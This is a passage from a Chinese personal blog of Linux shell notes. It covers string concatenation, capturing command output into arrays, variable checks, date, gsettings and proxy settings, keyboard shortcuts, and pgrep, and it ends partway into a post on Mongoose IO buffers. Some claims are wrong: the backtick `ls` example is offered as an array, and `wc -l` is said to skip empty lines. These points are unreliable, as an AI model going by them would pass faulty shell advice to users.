<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&quot;Hello, &quot;</span></span><br><span class="line">str2=<span class="string">&quot;world!&quot;</span></span><br><span class="line">result=<span class="string">&quot;$str1<span class="variable">$str2</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>这也会输出：<code>Hello, world!</code></p>
<ol start="3">
<li>使用<code>+=</code>操作符来追加字符串：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&quot;Hello, &quot;</span></span><br><span class="line">str1+=<span class="string">&quot;world!&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$str1</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>这将输出：<code>Hello, world!</code></p>
<ol start="4">
<li>使用命令替换来拼接字符串：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&quot;Hello, &quot;</span></span><br><span class="line">str2=<span class="string">&quot;world!&quot;</span></span><br><span class="line">result=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;str1&#125;</span><span class="variable">$&#123;str2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>这也会输出：<code>Hello, world!</code></p>
<ol start="5">
<li>在echo中直接拼接字符串：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&quot;Hello, &quot;</span></span><br><span class="line">str2=<span class="string">&quot;world!&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;str1&#125;</span><span class="variable">$&#123;str2&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>这将直接输出拼接后的字符串。</p>
<p>请根据你的需求和个人偏好选择合适的字符串拼接方法。在Bash中，上述示例中的任何一种方法都可以使用。</p>
<h2 id="将命令输出的信息存储到数组"><a href="#将命令输出的信息存储到数组" class="headerlink" title="将命令输出的信息存储到数组"></a>将命令输出的信息存储到数组</h2><p>在Linux Shell中，可以使用命令替换和数组来将命令的输出存储到一个数组中。有两种常用的方式来实现这个目标，分别是使用<code>$()</code>或反引号&#96;&#96;来进行命令替换。</p>
<p>假设你要将<code>ls</code>命令的输出存储到一个数组中，可以按照以下方式进行操作：</p>
<p>使用<code>$()</code>进行命令替换：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将ls命令的输出存储到数组files中</span></span><br><span class="line">files=($(<span class="built_in">ls</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出数组元素</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;files[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$file</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>使用反引号&#96;&#96;进行命令替换：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将ls命令的输出存储到数组files中</span></span><br><span class="line">files=`<span class="built_in">ls</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出数组元素</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;files[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$file</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是，如果文件名中包含空格或特殊字符，使用上述方法存储到数组中可能会导致文件名分割错误。为了避免这种情况，建议使用<code>read</code>命令来逐行读取命令输出，然后将每行存储到数组中：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用read命令逐行读取ls命令的输出并存储到数组files中</span></span><br><span class="line">IFS=$<span class="string">&#x27;\n&#x27;</span> <span class="built_in">read</span> -d <span class="string">&#x27;&#x27;</span> -r -a files &lt; &lt;(<span class="built_in">ls</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出数组元素</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;files[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$file</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>这种方法可以正确处理文件名中包含空格或特殊字符的情况。</p>
<p>请注意，存储命令输出到数组时，输出中的每个元素会根据换行符进行分割。如果输出是以空格或其他分隔符分隔的，可以使用<code>IFS</code>变量来设置分隔符。例如，如果输出是以空格分隔的，可以设置<code>IFS=&#39; &#39;</code>。</p>
<h2 id="判断变量是否为空"><a href="#判断变量是否为空" class="headerlink" title="判断变量是否为空"></a>判断变量是否为空</h2><p>在 Linux Shell 脚本中，可以使用不同的方式来判断一个变量是否为空。以下是几种常用的方法：</p>
<ol>
<li><p><strong>使用 if-else 语句</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$var</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;变量为空&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;变量不为空&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>在上述示例中，使用 <code>-z</code> 表达式来判断变量 <code>$var</code> 是否为空。如果为空，则执行 if 语句块中的命令；如果不为空，则执行 else 语句块中的命令。</p>
</li>
<li><p><strong>使用双引号和等号比较</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$var</span>&quot;</span> = <span class="string">&quot;&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;变量为空&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;变量不为空&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>这种方式使用双引号将变量引起来，并与空字符串进行等号比较，判断变量是否为空。</p>
</li>
<li><p><strong>使用双括号和双引号</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [[ -z <span class="string">&quot;<span class="variable">$var</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;变量为空&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;变量不为空&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>在这种方式中，使用双括号 <code>[[ ... ]]</code> 来进行条件判断，并使用双引号将变量引起来。</p>
</li>
</ol>
<p>需要注意的是，变量前面的 <code>$</code> 符号需要加上双引号，这样可以避免在变量为空时引发语法错误。</p>
<p>这些是常用的方式来判断一个变量是否为空。根据具体的需求和脚本环境，您可以选择适合您的方式来进行变量的判空操作。</p>
<p>希望这些解释对您有所帮助！如果您有更多问题，请随时提问。</p>
<h2 id="获取时间"><a href="#获取时间" class="headerlink" title="获取时间"></a>获取时间</h2><p>在 Shell 脚本中，可以使用 <code>date</code> 命令来获取当前的时间和日期。</p>
<p>要获取当前的完整时间，可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">current_time=$(<span class="built_in">date</span> +%T)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;当前时间：<span class="variable">$current_time</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>该命令使用 <code>%T</code> 格式化选项来获取当前时间，并将结果保存在 <code>current_time</code> 变量中。</p>
<p>如果你只需要获取当前的日期，可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">current_date=$(<span class="built_in">date</span> +%F)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;当前日期：<span class="variable">$current_date</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>这里使用 <code>%F</code> 格式化选项来获取当前日期，并将结果保存在 <code>current_date</code> 变量中。</p>
<p><code>date</code> 命令还有很多其他的格式化选项，你可以根据需求选择适合你的日期和时间格式。使用 <code>man date</code> 命令可以查看 <code>date</code> 命令的完整文档，其中包含了所有的格式化选项和用法示例。</p>
<p>除了 <code>date</code> 命令，还可以使用其他 Shell 内建的变量来获取当前时间和日期。例如：</p>
<ul>
<li><p>获取当前时间戳：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">current_timestamp=$(<span class="built_in">date</span> +%s)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;当前时间戳：<span class="variable">$current_timestamp</span>&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前年份：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">current_year=$(<span class="built_in">date</span> +%Y)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;当前年份：<span class="variable">$current_year</span>&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前月份：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">current_month=$(<span class="built_in">date</span> +%m)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;当前月份：<span class="variable">$current_month</span>&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>等等，根据具体需求选择适合的日期和时间信息。</p>
<hr>
<h2 id="gsettings-常用示例"><a href="#gsettings-常用示例" class="headerlink" title="gsettings 常用示例"></a>gsettings 常用示例</h2><p>以下是一些常见的 <code>gsettings</code> 命令示例，涵盖了不同的设置类别：</p>
<ol>
<li><p>修改桌面背景图片：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsettings <span class="built_in">set</span> org.gnome.desktop.background picture-uri <span class="string">&#x27;file:///path/to/image.jpg&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改桌面壁纸平铺方式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsettings <span class="built_in">set</span> org.gnome.desktop.background picture-options <span class="string">&#x27;scaled&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改桌面图标显示&#x2F;隐藏：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsettings <span class="built_in">set</span> org.gnome.desktop.background show-desktop-icons <span class="literal">false</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改窗口主题：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsettings <span class="built_in">set</span> org.gnome.desktop.wm.preferences theme <span class="string">&#x27;Adwaita&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改默认浏览器：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsettings <span class="built_in">set</span> org.gnome.desktop.default-applications.web-browser <span class="string">&#x27;firefox.desktop&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改鼠标双击行为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsettings <span class="built_in">set</span> org.gnome.desktop.peripherals.mouse double-click <span class="literal">true</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改键盘重复延迟和速度：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gsettings <span class="built_in">set</span> org.gnome.desktop.peripherals.keyboard delay 200</span><br><span class="line">gsettings <span class="built_in">set</span> org.gnome.desktop.peripherals.keyboard repeat-interval 20</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改屏幕亮度调节方式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsettings <span class="built_in">set</span> org.gnome.settings-daemon.plugins.power idle-dim <span class="literal">false</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>这些示例只是 <code>gsettings</code> 命令的一小部分。你可以通过查阅相关的文档或使用 <code>gsettings list-schemas</code>、<code>gsettings list-keys SCHEMA</code> 等命令来探索更多可用的设置和键。</p>
<p>请注意，命令中的 <code>SCHEMA</code> 和 <code>KEY</code> 根据要修改的设置不同而有所变化。确保替换命令中的占位符为适当的值。</p>
<hr>
<h2 id="gsettings-打开-关闭-代理"><a href="#gsettings-打开-关闭-代理" class="headerlink" title="gsettings 打开 关闭 代理"></a>gsettings 打开 关闭 代理</h2><p>在Ubuntu中，你可以使用<code>gsettings</code>命令来打开和关闭代理设置。以下是相关的命令示例：</p>
<p>打开代理：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gsettings set org.gnome.system.proxy mode &#x27;manual&#x27;</span><br><span class="line">gsettings set org.gnome.system.proxy.http host &#x27;proxy.example.com&#x27;</span><br><span class="line">gsettings set org.gnome.system.proxy.http port 8080</span><br></pre></td></tr></table></figure>
<p>将 <code>&#39;proxy.example.com&#39;</code> 替换为你的代理服务器地址，<code>8080</code> 替换为代理服务器端口号。</p>
<p>关闭代理：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsettings set org.gnome.system.proxy mode &#x27;none&#x27;</span><br></pre></td></tr></table></figure>

<p>这些命令将设置系统代理模式为手动（manual）并指定代理服务器的地址和端口。关闭代理时，将把系统代理模式设置为无（none）。</p>
<p>请注意，这些命令基于 GNOME 桌面环境的代理设置。如果你使用的是其他桌面环境，可能会有不同的命令或配置文件用于管理代理设置。</p>
<p>另外，使用<code>gsettings</code>命令修改的代理设置将在整个系统范围内生效，包括各个应用程序和网络连接。你可能需要重新启动一些应用程序或系统才能使代理设置生效。</p>
<hr>
<h2 id="linux-Ctrl-快捷命令"><a href="#linux-Ctrl-快捷命令" class="headerlink" title="linux Ctrl 快捷命令"></a>linux Ctrl 快捷命令</h2><p>在Linux中，Ctrl键（Control键）结合其他键组合可以触发各种快捷命令。下面是一些常用的Ctrl快捷键及其功能的详细解释：</p>
<ol>
<li><p>Ctrl+C：发送中断信号（SIGINT）给当前正在前台运行的进程，用于中断（终止）进程的执行。</p>
</li>
<li><p>Ctrl+Z：发送暂停信号（SIGTSTP）给当前正在前台运行的进程，将其挂起并放入后台。可以使用<code>fg</code>命令将其重新放到前台运行，或使用<code>bg</code>命令将其转换为后台运行。</p>
</li>
<li><p>Ctrl+D：表示输入流结束，用于退出交互式shell。当你在终端中输入Ctrl+D时，它会告诉shell当前输入结束，然后触发相应的行为，如关闭当前终端会话或退出交互式程序。</p>
</li>
<li><p>Ctrl+L：清除终端屏幕，等效于使用<code>clear</code>命令。它将当前终端窗口的内容滚动到顶部，使终端屏幕变为空白。</p>
</li>
<li><p>Ctrl+A：将光标移到命令行的开头。</p>
</li>
<li><p>Ctrl+E：将光标移到命令行的末尾。</p>
</li>
<li><p>Ctrl+K：删除光标位置到命令行末尾的文本。</p>
</li>
<li><p>Ctrl+U：删除光标位置到命令行开头的文本。</p>
</li>
<li><p>Ctrl+W：删除光标之前的一个单词。</p>
</li>
<li><p>Ctrl+R：在命令历史中进行反向搜索。</p>
</li>
<li><p>Ctrl+G：取消当前的编辑或操作，放弃正在进行的命令。</p>
</li>
</ol>
<p>这些是一些常见的Ctrl快捷键，在Linux终端中使用频率很高。它们可以帮助你更高效地控制终端会话、编辑命令行以及与进程进行交互。请注意，某些快捷键在特定的应用程序或环境中可能会有不同的功能或效果。</p>
<hr>
<h2 id="linux-alt-快捷命令"><a href="#linux-alt-快捷命令" class="headerlink" title="linux alt 快捷命令"></a>linux alt 快捷命令</h2><p>在Linux中，Alt键（也称为Meta键或Option键）结合其他键组合可以触发各种快捷命令。下面是一些常用的Alt快捷键及其功能的简要说明：</p>
<ol>
<li><p>Alt+Tab：在打开的窗口之间切换。按下Alt键并保持按住，然后连续按下Tab键可以切换到下一个窗口。松开Alt键时，所选的窗口将被激活。</p>
</li>
<li><p>Alt+F4：关闭当前活动的窗口。按下Alt键并保持按住，然后按下F4键可以关闭当前窗口。</p>
</li>
<li><p>Alt+Space：打开窗口菜单。按下Alt键并保持按住，然后按下Space键可以打开当前窗口的菜单选项，例如最大化、最小化、移动等。</p>
</li>
<li><p>Alt+Enter：在终端中切换全屏模式。按下Alt键并保持按住，然后按下Enter键可以在终端窗口之间切换全屏模式。</p>
</li>
<li><p>Alt+Up&#x2F;Down：在终端中上下滚动。按下Alt键并保持按住，然后按下上箭头或下箭头键可以在终端中上下滚动输出。</p>
</li>
<li><p>Alt+Left&#x2F;Right：在终端中左右切换。按下Alt键并保持按住，然后按下左箭头或右箭头键可以在终端中左右切换命令。</p>
</li>
</ol>
<p>这些是一些常见的Alt快捷键，在Linux中使用频率较高。请注意，某些快捷键可能因特定的桌面环境、窗口管理器或应用程序而有所不同。此外，Alt键也常用于与其他键组合以实现特定功能，具体取决于应用程序的键绑定设置。</p>
<h2 id="clear-清除屏幕信息-ctrl-L"><a href="#clear-清除屏幕信息-ctrl-L" class="headerlink" title="clear 清除屏幕信息  ctrl+L"></a>clear 清除屏幕信息  ctrl+L</h2><p>在Linux中，<code>clear</code>命令用于清除当前终端窗口上的内容，使其变为空白屏幕，以提供一个干净的工作环境。</p>
<p>使用<code>clear</code>命令非常简单，只需在终端中键入以下命令即可：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clear</span><br></pre></td></tr></table></figure>

<p>执行该命令后，当前终端窗口中的所有文本和输出将被清除，终端将变为空白屏幕，光标回到终端的起始位置。</p>
<p><code>clear</code>命令常用于清除终端中的大量输出或命令的执行结果，以便获得更好的可读性和清晰度。当终端窗口中显示的内容过多或杂乱时，使用<code>clear</code>命令可以快速清除屏幕并重新开始。</p>
<p>需要注意的是，<code>clear</code>命令只会清除当前终端窗口的内容，并不会影响其他终端或窗口的显示。当你切换到其他终端或打开新的终端窗口时，之前的内容仍然可见。</p>
<p>除了<code>clear</code>命令，你也可以使用快捷键<code>Ctrl + L</code>来达到相同的效果，它可以清除当前终端窗口的内容。</p>
<p>总结起来，<code>clear</code>命令用于清除当前终端窗口的内容，使其变为空白屏幕。这是一个简单但实用的命令，可以提供一个干净的工作环境。</p>
<hr>
<h2 id="查看目录下所有文件的行数"><a href="#查看目录下所有文件的行数" class="headerlink" title="查看目录下所有文件的行数"></a>查看目录下所有文件的行数</h2><p>要查看Linux中一个目录下所有文件的行数，可以使用<code>find</code>命令与<code>wc</code>命令的组合。以下是一个示例命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /path/to/directory -type f -exec cat &#123;&#125; + | wc -l</span><br></pre></td></tr></table></figure>

<p>请替换<code>/path/to/directory</code>为你想要查看的目录的实际路径。</p>
<p>该命令的解释如下：</p>
<ul>
<li><code>find /path/to/directory</code>：查找指定目录下的所有文件。</li>
<li><code>-type f</code>：限定只查找普通文件，排除目录和其他特殊文件。</li>
<li><code>-exec cat &#123;&#125; +</code>：对找到的每个文件执行<code>cat</code>命令，将文件内容输出到标准输出。</li>
<li><code>|</code>：将<code>cat</code>命令的输出通过管道传递给下一个命令。</li>
<li><code>wc -l</code>：对输入进行行数统计，输出总行数。</li>
</ul>
<p>执行该命令后，会输出指定目录下所有文件的总行数。</p>
<p>请注意，如果目录下的文件较多或文件较大，这个命令可能需要一些时间来完成执行。另外，该命令只统计文件中的行数，不包括空行和文件夹的行数。</p>
<hr>
<h2 id="根据进程名-获取进程id"><a href="#根据进程名-获取进程id" class="headerlink" title="根据进程名 获取进程id"></a>根据进程名 获取进程id</h2><p>在Shell脚本中，可以使用<code>pgrep</code>命令来根据进程名获取进程ID（PID）。<code>pgrep</code>命令可以根据进程名模式匹配正在运行的进程，并返回符合条件的进程ID。</p>
<p>以下是一个示例Shell脚本，演示如何使用<code>pgrep</code>命令获取进程ID：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">process_name=<span class="string">&quot;example_process&quot;</span>  <span class="comment"># 设置进程名</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用pgrep命令获取进程ID</span></span><br><span class="line">pid=$(pgrep <span class="string">&quot;<span class="variable">$process_name</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$pid</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;进程 <span class="variable">$process_name</span> 的PID为: <span class="variable">$pid</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;未找到进程 <span class="variable">$process_name</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>在上述示例中，首先定义了要查找的进程名为<code>example_process</code>。然后，使用<code>pgrep</code>命令和进程名作为参数来获取进程ID。如果找到了符合条件的进程，<code>$pid</code>变量将保存进程ID，并打印出来。如果未找到进程，则打印相应的提示信息。</p>
<p>可以将上述脚本保存为<code>.sh</code>文件，并在Shell环境中运行，即可根据进程名获取进程ID。</p>
<p>需要注意的是，<code>pgrep</code>命令还支持其他选项，如根据用户、进程所属终端等条件进行进程查找。您可以通过<code>man pgrep</code>命令查看<code>pgrep</code>命令的详细用法和选项。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_io_buffers/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_io_buffers/" class="post-title-link" itemprop="url">mongoose_io_buffers</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>mongoose的出站入站缓冲区接口</li>
<li>IO缓冲区由结构mg_iobuf描述，是一个简单的数据结构，可以在任意偏移量插入或删除数据块，并自动增长&#x2F;收缩。</li>
</ul>
<h2 id="struct-mg-iobuf"><a href="#struct-mg-iobuf" class="headerlink" title="struct mg_iobuf"></a>struct mg_iobuf</h2><ul>
<li><p>简介：</p>
<ul>
<li>通用IO缓冲区。size指定buf指向的数据的分配大小，len指定当前存储的字节数。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_iobuf</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *buf;  <span class="comment">// Pointer to stored data</span></span><br><span class="line">  <span class="type">size_t</span> size;         <span class="comment">// Total size available</span></span><br><span class="line">  <span class="type">size_t</span> len;          <span class="comment">// Current number of bytes</span></span><br><span class="line">  <span class="type">size_t</span> align;        <span class="comment">// Alignment during allocation</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-iobuf-init"><a href="#mg-iobuf-init" class="headerlink" title="mg_iobuf_init"></a>mg_iobuf_init</h2><ul>
<li><p>简介：</p>
<ul>
<li>初始化IO缓冲区，分配字节大小</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">mg_iobuf_init</span><span class="params">(<span class="keyword">struct</span> mg_iobuf *io, <span class="type">size_t</span> size, <span class="type">size_t</span> align)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>io    – 要初始化的mg_iobuf结构的指针</li>
<li>size  – 分配的字节数</li>
<li>align – 将大小对齐到对齐内存边界。0表示不对齐</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>1 – 成功</li>
<li>0 – 失败</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_iobuf</span> io;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">mg_iobuf_init</span>(&amp;io, <span class="number">0</span>, <span class="number">64</span>)) &#123;</span><br><span class="line">  <span class="comment">// io successfully initialized</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-iobuf-resize"><a href="#mg-iobuf-resize" class="headerlink" title="mg_iobuf_resize"></a>mg_iobuf_resize</h2><ul>
<li><p>简介：</p>
<ul>
